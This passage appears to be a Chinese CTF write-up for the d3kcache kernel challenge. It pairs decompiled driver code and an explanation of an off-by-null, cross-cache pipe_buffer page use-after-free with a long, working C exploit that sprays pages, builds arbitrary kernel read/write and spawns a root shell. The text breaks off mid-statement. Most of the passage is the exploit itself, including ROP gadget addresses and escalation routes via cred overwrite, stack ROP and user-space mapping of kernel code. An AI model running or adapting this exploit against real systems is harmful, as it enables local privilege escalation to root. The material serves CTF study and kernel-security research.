v0;&#125;\n\n首先看初始化模块部分，可以看到里面调用了前面提到的kmem_cache_create_usercopy函数，并且参数中size指定为0x800，那么根据前面所以到的，这里的order即为3。\n__int64 __fastcall d3kcache_ioctl(__int64 a1, int a2, __int64 a3)&#123;  __int64 v4; // rax  __int64 v5; // rbx  int v7; // ecx  __int64 v8; // r14  __int64 v9; // r15  __int64 v10; // r12  int v11; // ecx  __int64 v12; // rbx  __int64 v13; // r14  __int64 v14; // r15  __int64 v15; // rax  __int64 v16; // r15  unsigned int v17; // r13d  __int64 v18; // r14  __int64 v19; // r12  __int64 v20; // r14  unsigned __int64 v21; // rbx  __int64 v22; // rax  __int64 v23; // r12  unsigned __int64 v24; // rbx  void *v25; // rdi  unsigned int v26; // [rsp-48h] [rbp-48h] BYREF  unsigned int v27; // [rsp-44h] [rbp-44h]  __int64 v28; // [rsp-40h] [rbp-40h]  unsigned __int64 v29; // [rsp-38h] [rbp-38h]  v29 = __readgsqword(0x28u);  raw_spin_lock(&amp;spin);  v4 = copy_from_user(&amp;v26, a3, 16LL);  v5 = -1LL;  if ( v4 )    goto LABEL_2;  if ( a2 &gt; 0x80F )  &#123;    if ( a2 == 0x810 )    &#123;      if ( v26 &gt; 0xFuLL || !qword_17D8[2 * v26] )      &#123;        v25 = &amp;unk_882;        goto LABEL_46;      &#125;      kmem_cache_free(kcache_jar);      v20 = (int)v26;      if ( (unsigned __int64)(int)v26 &gt; 0xF )      &#123;        _ubsan_handle_out_of_bounds(&amp;off_12A0, v26);        v21 = (int)v26;        qword_17D8[2 * v20] = 0LL;        if ( v21 &gt;= 0x10 )          _ubsan_handle_out_of_bounds(&amp;off_12C0, (unsigned int)v21);      &#125;      else      &#123;        qword_17D8[2 * (int)v26] = 0LL;        v21 = (unsigned int)v20;      &#125;      kcache_list[4 * v21] = 0;      v5 = 0LL;    &#125;    else    &#123;      if ( a2 != 6425 )        goto LABEL_42;      if ( v26 &gt; 0xFuLL || !qword_17D8[2 * v26] )      &#123;        v25 = &amp;unk_85D;        goto LABEL_46;      &#125;      v11 = v27;      if ( v27 &gt; kcache_list[4 * v26] )        v11 = kcache_list[4 * v26];      if ( v11 &lt; 0 )        BUG();      v12 = (unsigned int)v11;      v13 = qword_17D8[2 * v26];      v14 = v28;      _check_object_size(v13, (unsigned int)v11, 1LL);      v5 = -(__int64)(copy_to_user(v14, v13, v12) != 0);    &#125;  &#125;  else  &#123;    if ( a2 != 0x114 )    &#123;      if ( a2 == 0x514 )      &#123;        if ( v26 &lt;= 0xFuLL &amp;&amp; qword_17D8[2 * v26] )        &#123;          v7 = v27;          if ( v27 &gt; 0x800 || v27 + kcache_list[4 * v26] &gt;= 0x800 )            v7 = 2048 - kcache_list[4 * v26];          if ( v7 &lt; 0 )            BUG();          v8 = qword_17D8[2 * v26] + (unsigned int)kcache_list[4 * v26];          v9 = (unsigned int)v7;          v10 = v28;          _check_object_size(v8, (unsigned int)v7, 0LL);          if ( !copy_from_user(v8, v10, v9) )          &#123;            *(_BYTE *)(v8 + v9) = 0;            v5 = 0LL;          &#125;          goto LABEL_2;        &#125;        v25 = &amp;unk_837;LABEL_46:        printk(v25);        goto LABEL_2;      &#125;LABEL_42:      v25 = &amp;unk_8AA;      goto LABEL_46;    &#125;    if ( v26 &gt;= 0x10uLL )    &#123;      v25 = &amp;unk_782;      goto LABEL_46;    &#125;    if ( qword_17D8[2 * v26] )    &#123;      v25 = &amp;unk_7F6;      goto LABEL_46;    &#125;    v15 = kmem_cache_alloc(kcache_jar, 0xDC0LL);    if ( !v15 )    &#123;      v25 = &amp;unk_81A;      goto LABEL_46;    &#125;    v16 = v15;    v17 = v27;    v18 = 2048LL;    if ( v27 &lt; 0x800 )      v18 = v27;    v19 = v28;    _check_object_size(v15, v18, 0LL);    if ( copy_from_user(v16, v19, v18) )    &#123;      kmem_cache_free(kcache_jar);    &#125;    else    &#123;      v22 = 0x7FFLL;      if ( v17 &lt; 0x7FF )        v22 = v17;      *(_BYTE *)(v16 + v22) = 0;      v23 = (int)v26;      if ( (unsigned __int64)(int)v26 &gt; 0xF )      &#123;        _ubsan_handle_out_of_bounds(&amp;off_1260, v26);        v24 = (int)v26;        qword_17D8[2 * v23] = v16;        if ( v24 &gt;= 0x10 )          _ubsan_handle_out_of_bounds(&amp;off_1280, (unsigned int)v24);      &#125;      else      &#123;        qword_17D8[2 * (int)v26] = v16;        v24 = (unsigned int)v23;      &#125;      kcache_list[4 * v24] = v18;      v5 = 0LL;    &#125;  &#125;LABEL_2:  raw_spin_unlock(&amp;spin);  return v5;&#125;\n\n再就是ioctl函数，逆向分析过后可以发现这里分为四个分支，也就是增删改查，这里漏洞发生在增和改的部分，存在很明显的off by null。除此之外再无其他漏洞。\n预期利用分析根据前面所述的内容，目前已经达到了vuln slab page和victim slab page相邻的情况了，而经过后续的分析我们可以得知前面两个页面分别对应的是题目中创建的slab page和pipe_buffer所在的slab_page。答案已经呼之欲出了，如果我们使用题目的off by null漏洞，我们就可以让pipe_buffer-&gt;page指针指向其他pipe_buffer所指向的位置，而如果我们控制其中一个pipe_buffer并释放掉page，就形成了页级的UAF。不过page的大小只有0x40所以成功率只有1/4，因为以0x00结尾时off by null无法影响其指向。\n\n\n目前我们已经形成了页级的UAF，那么如果我们在已经free的page处申请pipe_buffer会发生什么呢？\n\n结果就是会形成如上图一样的结构，此时我们可以通过最左边的pipe_buffer读取到它page指向的新的pipe_buffer中的内容，并且此时我们不光可以读取还可以对page的内容进行写，可以让最右边的两个pipe_buffer的page指针又指向同一个，从而形成下面这种情况：\n根据上面的思路，我们还可以将最右边的page给free掉又一次造成了页级的UAF，但是这一次不同的是我们通过第一次的泄漏可以知道最右边page的地址的。有趣的来了，在最右边造成了页级的UAF之后我们继续申请pipe_buffer放在最右边的page中，并且控制里面pipe_buffer的page指针指向自身，最终形成下面这种情况：\n\n因为是一个页级UAF的缘故，我们还可以使用中间的pipe去修改下面的其他pipe_buffer，所以在最右侧，我们总共可以控制到三个pipe_buffer。而这三个pipe_buffer的作用分别是：\n\n  第一个管道通过page指针内存空间的任意地址读写\n  第二个管道用于修改第三个管道的内容，让第三个管道可以指向第一个管道\n  第三个管道用于修改第一个管道和第二个管道，修改第一个管道的page到指定位置，修改第二个管道的指向为第三个管道\n\n这样三个管道实现互相循环修改，即可实现整个内核内存空间几乎无任何限制的任意地址读写。\n既然已经可以任意地址无限制读写了，那么提权的方式也就多种多样了。当然，这里需要提前注意到的是pipe_buffer中的page指针终归是要指向到page结构体的。而内核中vmemmap区域中存放着所有的page结构体，所以首要找到vmemmap区域即可。\n那么第一种方法就是通过修改task_struct中的cred指针为init_cred的地址。\n第二种方法就是通过写内核栈实现ROP的办法，首先需要泄漏出栈地址，在task_struct结构体中存在一个stack成员，顾名思义其中存放的就是栈地址，不过这里存放的是虚拟地址。不过我们如果要往栈空间中写内容的话需要知道他对应的物理地址对应的page结构地址。好在我们可以通过页表获取到对应的物理地址，在task_struct结构体中的mm成员中存放的是mm_struct结构体的地址，而我们可以通过mm_struct结构体中的pgd成员获取到页表的地址。最后通过也变转化即可获取到栈地址对应的page结构体地址了，进而往栈中写入准备的rop即可。\n第三种方法就是通过USMA进行利用也就是用户态映射攻击，原理则是修改内核代码段的内容，不过直接通过直接映射区去修改的话会因为没有写入权限造成kernel panic。但是，改写内核代码段的本质是向其所对应的物理页面写入数据，所以既然我们可以对页表进行读写，那么我们就可以直接在用户空间建立一个到内核代码段对应物理内存的映射就可以改写内核代码了。\n综上所述，可得exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#define PGV_PAGE_NUM 1000#define PGV_1PAGE_SPRAY_NUM 0x20#define PGV_4PAGES_SPRAY_NUM 0x40#define PGV_4PAGES_START_IDX 0x20#define PGV_8PAGES_SPRAY_NUM 0x40#define PGV_8PAGES_START_IDX 0x60#define PACKET_VERSION 10#define PACKET_TX_RING 13#define PIPE_SPRAY_NUM 200#define SND_PIPE_BUF_SZ 96#define TRD_PIPE_BUF_SZ 192void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;unsigned long kernel_addr;unsigned long kernel_base;unsigned long kernel_offset;int fd;struct option&#123;    unsigned int idx;    unsigned int size;    char *buf;&#125;;void create(unsigned int idx, unsigned int size, char *buf)&#123;    struct option *option = malloc(sizeof(struct option));    option-&gt;idx = idx;    option-&gt;size = size;    option-&gt;buf = buf;    ioctl(fd, 0x114, option);&#125;void delete(unsigned int idx)&#123;    struct option *option = malloc(sizeof(struct option));    option-&gt;idx = idx;    ioctl(fd, 0x810, option);&#125;void show(unsigned int idx, unsigned int size, char *buf)&#123;    struct option *option = malloc(sizeof(struct option));    option-&gt;idx = idx;    option-&gt;size = size;    option-&gt;buf = buf;    ioctl(fd, 0x1919, option);&#125;void edit(unsigned int idx, unsigned int size, char *buf)&#123;    struct option *option = malloc(sizeof(struct option));    option-&gt;idx = idx;    option-&gt;size = size;    option-&gt;buf = buf;    ioctl(fd, 0x514, option);&#125;struct pgv_page_request&#123;    int idx;    int cmd;    unsigned int size;    unsigned int nr;&#125;;enum tpacket_versions&#123;    TPACKET_V1,    TPACKET_V2,    TPACKET_V3,&#125;;struct tpacket_req&#123;    unsigned int tp_block_size;    unsigned int tp_block_nr;    unsigned int tp_frame_size;    unsigned int tp_frame_nr;&#125;;int cmd_pipe_req[2], cmd_pipe_reply[2];int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)&#123;    struct tpacket_req req;    int socket_fd, version;    int ret;    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);    if (socket_fd &lt; 0)    &#123;        printf(&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\\n&quot;);        ret = socket_fd;        return ret;    &#125;    version = TPACKET_V1;    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,                     &amp;version, sizeof(version));    if (ret &lt; 0)    &#123;        printf(&quot;[x] failed at setsockopt(PACKET_VERSION)\\n&quot;);        close(socket_fd);        return ret;    &#125;    memset(&amp;req, 0, sizeof(req));    req.tp_block_size = size;    req.tp_block_nr = nr;    req.tp_frame_size = 0x1000;    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, sizeof(req));    if (ret &lt; 0)    &#123;        printf(&quot;[x] failed at setsockopt(PACKET_TX_RING)\\n&quot;);        close(socket_fd);        return ret;    &#125;    return socket_fd;&#125;int alloc_page(int idx, unsigned int size, unsigned int nr)&#123;    struct pgv_page_request req = &#123;        .idx = idx,        .cmd = 0,        .size = size,        .nr = nr,    &#125;;    int ret;    write(cmd_pipe_req[1], &amp;req, sizeof(struct pgv_page_request));    read(cmd_pipe_reply[0], &amp;ret, sizeof(ret));    return ret;&#125;int free_page(int idx)&#123;    struct pgv_page_request req = &#123;        .idx = idx,        .cmd = 1,    &#125;;    int ret;    write(cmd_pipe_req[1], &amp;req, sizeof(req));    read(cmd_pipe_reply[0], &amp;ret, sizeof(ret));    usleep(10000);    return ret;&#125;struct page;struct pipe_inode_info;struct pipe_buf_operations;struct pipe_buffer&#123;    struct page *page;    unsigned int offset, len;    const struct pipe_buf_operations *ops;    unsigned int flags;    unsigned long private;&#125;;int pipe_fd[PIPE_SPRAY_NUM][2];struct pipe_buffer evil_2nd_buf, evil_3rd_buf, evil_4th_buf;int self_4th_pipe_pid = -1;int self_2nd_pipe_pid = -1;int self_3rd_pipe_pid = -1;char temp_zero_buf[0x1000] = &#123;&#x27;\\0&#x27;&#125;;void arbitrary_read_by_pipe(struct page *page_to_read, void *dst)&#123;    evil_2nd_buf.offset = 0;    evil_2nd_buf.len = 0x1ff8;    evil_2nd_buf.page = page_to_read;    write(pipe_fd[self_3rd_pipe_pid][1], &amp;evil_4th_buf, sizeof(evil_4th_buf));    write(pipe_fd[self_4th_pipe_pid][1], &amp;evil_2nd_buf, sizeof(evil_2nd_buf));    write(pipe_fd[self_4th_pipe_pid][1],          temp_zero_buf,          TRD_PIPE_BUF_SZ - sizeof(evil_2nd_buf));    write(pipe_fd[self_4th_pipe_pid][1], &amp;evil_3rd_buf, sizeof(evil_3rd_buf));    read(pipe_fd[self_2nd_pipe_pid][0], dst, 0xfff);&#125;void arbitrary_write_by_pipe(struct page *page_to_write, void *src, size_t len)&#123;    evil_2nd_buf.page = page_to_write;    evil_2nd_buf.offset = 0;    evil_2nd_buf.len = 0;    write(pipe_fd[self_3rd_pipe_pid][1], &amp;evil_4th_buf, sizeof(evil_4th_buf));    write(pipe_fd[self_4th_pipe_pid][1], &amp;evil_2nd_buf, sizeof(evil_2nd_buf));    write(pipe_fd[self_4th_pipe_pid][1],          temp_zero_buf,          TRD_PIPE_BUF_SZ - sizeof(evil_2nd_buf));    write(pipe_fd[self_4th_pipe_pid][1], &amp;evil_3rd_buf, sizeof(evil_3rd_buf));    write(pipe_fd[self_2nd_pipe_pid][1], src, len);&#125;uint64_t page_offset_base;uint64_t vmemmap_base;size_t direct_map_addr_to_page_addr(size_t direct_map_addr)&#123;    size_t page_count;    page_count = ((direct_map_addr &amp; (~0xfff)) - page_offset_base) / 0x1000;    return vmemmap_base + page_count * 0x40;&#125;#define COMMIT_CREDS 0xffffffff811284e0#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90#define INIT_CRED 0xffffffff83079ee8#define POP_RDI_RET 0xffffffff810157a9#define RET 0xffffffff810157aa#define PTE_OFFSET 12#define PMD_OFFSET 21#define PUD_OFFSET 30#define PGD_OFFSET 39#define PT_ENTRY_MASK 0b111111111UL#define PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)#define PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)#define PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)#define PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)#define PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)#define PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)#define PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)#define PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)// #define PAGE_ATTR_RW (1UL &lt;&lt; 1)#define PAGE_ATTR_NX (1UL &lt;&lt; 63)#define NS_CAPABLE_SETID 0xffffffff810fd2a0int main()&#123;    save_status();    char *buf = malloc(0x2000);    char target[16];    size_t target_addr;    strcpy(target, &quot;trytofind196082&quot;);    if (prctl(PR_SET_NAME, target, 0, 0, 0) != 0)    &#123;        errExit(&quot;cannot set name&quot;);    &#125;    fd = open(&quot;/dev/d3kcache&quot;, O_RDWR);    if (fd == -1)    &#123;        errExit(&quot;[-] faild open d3kcache!&quot;);    &#125;    pipe(cmd_pipe_req);    pipe(cmd_pipe_reply);    if (!fork())    &#123;        struct pgv_page_request req;        int socket_fd[PGV_PAGE_NUM];        int ret;        char edit[0x100];        int tmp_fd;        unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);        tmp_fd = open(&quot;/proc/self/setgroups&quot;, O_WRONLY);        write(tmp_fd, &quot;deny&quot;, strlen(&quot;deny&quot;));        close(tmp_fd);        tmp_fd = open(&quot;/proc/self/uid_map&quot;, O_WRONLY);        snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, getuid());        write(tmp_fd, edit, strlen(edit));        close(tmp_fd);        tmp_fd = open(&quot;/proc/self/gid_map&quot;, O_WRONLY);        snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, getgid());        write(tmp_fd, edit, strlen(edit));        close(tmp_fd);        while (1)        &#123;            read(cmd_pipe_req[0], &amp;req, sizeof(req));            if (req.cmd == 0)            &#123;                ret = create_socket_and_alloc_pages(req.size, req.nr);                socket_fd[req.idx] = ret;            &#125;            else if (req.cmd == 1)            &#123;                ret = close(socket_fd[req.idx]);            &#125;            else if (req.cmd == 2)            &#123;                exit(0);            &#125;            write(cmd_pipe_reply[1], &amp;ret, sizeof(ret));        &#125;    &#125;    int pgv_1page_start_idx = 0;    int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;    int pgv_8pages_start_idx = PGV_8PAGES_START_IDX;    &#123;        puts(&quot;[*] spray pgv order-0 pages...&quot;);        for (int i = 0; i &lt; PGV_1PAGE_SPRAY_NUM; i++)        &#123;            if (alloc_page(i, 0x1000, 1) &lt; 0)            &#123;                printf(&quot;[x] failed to create %d socket for pages spraying!\\n&quot;, i);                errExit(&quot;Faild to spray pgv!&quot;);            &#125;        &#125;        puts(&quot;[*] spray pgv order-2 pages...&quot;);        for (int i = 0; i &lt; PGV_4PAGES_SPRAY_NUM; i++)        &#123;            if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) &lt; 0)            &#123;                printf(&quot;[x] failed to create %d socket for pages spraying!\\n&quot;, i);                errExit(&quot;Faild to spray pgv!&quot;);            &#125;        &#125;        puts(&quot;[*] spray pgv order-3 pages...&quot;);        for (int i = 0; i &lt; PGV_8PAGES_SPRAY_NUM; i++)        &#123;            if (i % 19 == 0)            &#123;                free_page(pgv_4pages_start_idx++);            &#125;            if (i % 21 == 0)            &#123;                free_page(pgv_1page_start_idx += 2);            &#125;            if (i % 512 == 0)            &#123;                free_page(pgv_1page_start_idx += 2);            &#125;            if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) &lt; 0)            &#123;                printf(&quot;[x] failed to create %d socket for pages spraying!\\n&quot;, i);                errExit(&quot;Faild to spray pgv!&quot;);            &#125;        &#125;    &#125;    int victim_pid = -1;    int orig_pid = -1;    &#123;        puts(&quot;[*] spray pipe_buffer...&quot;);        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (pipe(pipe_fd[i]) &lt; 0)            &#123;                printf(&quot;[x] failed to alloc %d pipe!&quot;, i);                errExit(&quot;FAILED to create pipe!&quot;);            &#125;        &#125;        puts(&quot;[*] exetend pipe_buffer...&quot;);        for (int i = 0; i &lt; (PIPE_SPRAY_NUM / 2); i++)        &#123;            if (i % 8 == 0)            &#123;                free_page(pgv_8pages_start_idx++);            &#125;            if (fcntl(pipe_fd[0 + i][1], F_SETPIPE_SZ, 0x1000 * 64) &lt; 0)            &#123;                printf(&quot;[x] failed to extend %d pipe!\\n&quot;, 0 + i);                errExit(&quot;FAILED to extend pipe!&quot;);            &#125;        &#125;        puts(&quot;[*] spray vulnerable 2k obj...&quot;);        free_page(pgv_8pages_start_idx++);        for (int i = 0; i &lt; 0x10; i++)        &#123;            create(i, 8, &quot;0x196082&quot;);        &#125;        puts(&quot;[*] exetend pipe_buffer...&quot;);        for (int i = 0; i &lt; (PIPE_SPRAY_NUM / 2); i++)        &#123;            if (i % 8 == 0)            &#123;                free_page(pgv_8pages_start_idx++);            &#125;            if (fcntl(pipe_fd[(PIPE_SPRAY_NUM / 2) + i][1], F_SETPIPE_SZ, 0x1000 * 64) &lt; 0)            &#123;                printf(&quot;[x] failed to extend %d pipe!\\n&quot;, (PIPE_SPRAY_NUM / 2) + i);                errExit(&quot;FAILED to extend pipe!&quot;);            &#125;        &#125;        puts(&quot;[*] allocating pipe pages...&quot;);        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            write(pipe_fd[i][1], &quot;0x196082&quot;, 8);            write(pipe_fd[i][1], &amp;i, sizeof(int));            write(pipe_fd[i][1], &amp;i, sizeof(int));            write(pipe_fd[i][1], &amp;i, sizeof(int));            write(pipe_fd[i][1], &quot;0x196082&quot;, 8);            write(pipe_fd[i][1], &quot;0x196082&quot;, 8);        &#125;        puts(&quot;[*] trigerring cross-cache off-by-null...&quot;);        show(0, 0, buf);        memset(buf, 0x61, 0x800);        for (int i = 0; i &lt; 0x10; i++)        &#123;            edit(i, 0x7f8, buf);        &#125;        show(0, 0, buf);        puts(&quot;[*] checking for corruption...&quot;);        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            char str_flag[0x10];            int nr;            memset(str_flag, &#x27;\\0&#x27;, sizeof(str_flag));            read(pipe_fd[i][0], str_flag, 8);            read(pipe_fd[i][0], &amp;nr, sizeof(int));            if (!strcmp(str_flag, &quot;0x196082&quot;) &amp;&amp; nr != i)            &#123;                orig_pid = nr;                victim_pid = i;                printf(&quot;\\033[32m\\033[1m[+] Found victim: \\033[0m%d &quot;                       &quot;\\033[32m\\033[1m, orig: \\033[0m%d\\n\\n&quot;,                       victim_pid, orig_pid);                break;            &#125;        &#125;        if (victim_pid == -1)        &#123;            errExit(&quot;FAILED to corrupt pipe_buffer!&quot;);        &#125;    &#125;    int snd_orig_pid = -1;    int snd_vicitm_pid = -1;    struct pipe_buffer info_pipe_buf;    &#123;        size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ / sizeof(struct pipe_buffer));        memset(buf, &#x27;\\0&#x27;, sizeof(buf));        write(pipe_fd[victim_pid][1], buf, SND_PIPE_BUF_SZ * 2 - 24 - 3 * sizeof(int));        puts(&quot;[*] free original pipe...&quot;);        close(pipe_fd[orig_pid][0]);        close(pipe_fd[orig_pid][1]);        puts(&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;);        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (i == orig_pid || i == victim_pid)            &#123;                continue;            &#125;            if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, snd_pipe_sz) &lt; 0)            &#123;                printf(&quot;[x] failed to resize %d pipe!\\n&quot;, i);                errExit(&quot;FAILED to re-alloc pipe_buffer!&quot;);            &#125;        &#125;        read(pipe_fd[victim_pid][0], buf, SND_PIPE_BUF_SZ - 8 - sizeof(int));        read(pipe_fd[victim_pid][0], &amp;info_pipe_buf, sizeof(info_pipe_buf));        printf(&quot;\\033[34m\\033[1m[?] info_pipe_buf-&gt;page: \\033[0m%p\\n&quot;               &quot;\\033[34m\\033[1m[?] info_pipe_buf-&gt;ops: \\033[0m%p\\n&quot;,               info_pipe_buf.page, info_pipe_buf.ops);        if ((size_t)info_pipe_buf.page &lt; 0xffff000000000000 || (size_t)info_pipe_buf.ops &lt; 0xffffffff81000000)        &#123;            errExit(&quot;FAILED to re-hit victim page!&quot;);        &#125;        puts(&quot;\\033[32m\\033[1m[+] Successfully to hit the UAF page!\\033[0m&quot;);        printf(&quot;\\033[32m\\033[1m[+] Got page leak:\\033[0m %p\\n&quot;, info_pipe_buf.page);        puts(&quot;&quot;);        puts(&quot;[*] construct a second-level uaf pipe page...&quot;);        info_pipe_buf.page = (struct page *)((size_t)info_pipe_buf.page + 0x40);        write(pipe_fd[victim_pid][1], &amp;info_pipe_buf, sizeof(info_pipe_buf));        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            int nr;            if (i == orig_pid || i == victim_pid)            &#123;                continue;            &#125;            read(pipe_fd[i][0], &amp;nr, sizeof(nr));            if (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)            &#123;                snd_orig_pid = nr;                snd_vicitm_pid = i;                printf(&quot;\\033[32m\\033[1m[+] Found second-level victim: \\033[0m%d &quot;                       &quot;\\033[32m\\033[1m, orig: \\033[0m%d\\n&quot;,                       snd_vicitm_pid, snd_orig_pid);                break;            &#125;        &#125;        if (snd_vicitm_pid == -1)        &#123;            errExit(&quot;FAILED to corrupt second-level pipe_buffer!&quot;);        &#125;    &#125;    &#123;        size_t trd_pipe_sz = 0x1000 * (TRD_PIPE_BUF_SZ / sizeof(struct pipe_buffer));        struct pipe_buffer evil_pipe_buf;        struct page *page_ptr;        memset(buf, 0, sizeof(buf));        write(pipe_fd[snd_vicitm_pid][1], buf, TRD_PIPE_BUF_SZ - 24 - 3 * sizeof(int));        puts(&quot;[*] free second-level original pipe...&quot;);        close(pipe_fd[snd_orig_pid][0]);        close(pipe_fd[snd_orig_pid][1]);        puts(&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;);        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)            &#123;                continue;            &#125;            if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, trd_pipe_sz) &lt; 0)            &#123;                printf(&quot;[x] failed to resize %d pipe!\\n&quot;, i);                errExit(&quot;FAILED to re-alloc pipe_buffer!&quot;);            &#125;        &#125;        puts(&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;);        evil_pipe_buf.page = info_pipe_buf.page;        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;        evil_pipe_buf.ops = info_pipe_buf.ops;        evil_pipe_buf.flags = info_pipe_buf.flags;        evil_pipe_buf.private = info_pipe_buf.private;        write(pipe_fd[snd_vicitm_pid][1], &amp;evil_pipe_buf, sizeof(evil_pipe_buf));        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)            &#123;                continue;            &#125;            read(pipe_fd[i][0], &amp;page_ptr, sizeof(page_ptr));            if (page_ptr == evil_pipe_buf.page)            &#123;                self_2nd_pipe_pid = i;                printf(&quot;\\033[32m\\033[1m[+] Found self-writing pipe: \\033[0m%d\\n&quot;,                       self_2nd_pipe_pid);                break;            &#125;        &#125;        if (self_2nd_pipe_pid == -1)        &#123;            errExit(&quot;FAILED to build a self-writing pipe!&quot;);        &#125;        puts(&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;);        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;        write(pipe_fd[snd_vicitm_pid][1], buf, TRD_PIPE_BUF_SZ - sizeof(evil_pipe_buf));        write(pipe_fd[snd_vicitm_pid][1], &amp;evil_pipe_buf, sizeof(evil_pipe_buf));        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)            &#123;                continue;            &#125;            read(pipe_fd[i][0], &amp;page_ptr, sizeof(page_ptr));            if (page_ptr == evil_pipe_buf.page)            &#123;                self_3rd_pipe_pid = i;                printf(&quot;\\033[32m\\033[1m[+] Found another self-writing pipe:\\033[0m&quot;                       &quot;%d\\n&quot;,                       self_3rd_pipe_pid);                break;            &#125;        &#125;        if (self_3rd_pipe_pid == -1)        &#123;            errExit(&quot;FAILED to build a self-writing pipe!&quot;);        &#125;        puts(&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;);        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;        write(pipe_fd[snd_vicitm_pid][1], buf, TRD_PIPE_BUF_SZ - sizeof(evil_pipe_buf));        write(pipe_fd[snd_vicitm_pid][1], &amp;evil_pipe_buf, sizeof(evil_pipe_buf));        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i == self_3rd_pipe_pid)            &#123;                continue;            &#125;            read(pipe_fd[i][0], &amp;page_ptr, sizeof(page_ptr));            if (page_ptr == evil_pipe_buf.page)            &#123;                self_4th_pipe_pid = i;                printf(&quot;\\033[32m\\033[1m[+] Found another self-writing pipe:\\033[0m&quot;                       &quot;%d\\n&quot;,                       self_4th_pipe_pid);                break;            &#125;        &#125;        if (self_4th_pipe_pid == -1)        &#123;            errExit(&quot;FAILED to build a self-writing pipe!&quot;);        &#125;    &#125;    &#123;        puts(&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;);        memcpy(&amp;evil_2nd_buf, &amp;info_pipe_buf, sizeof(evil_2nd_buf));        memcpy(&amp;evil_3rd_buf, &amp;info_pipe_buf, sizeof(evil_3rd_buf));        memcpy(&amp;evil_4th_buf, &amp;info_pipe_buf, sizeof(evil_4th_buf));        evil_2nd_buf.offset = 0;        evil_2nd_buf.len = 0xff0;        evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * 3;     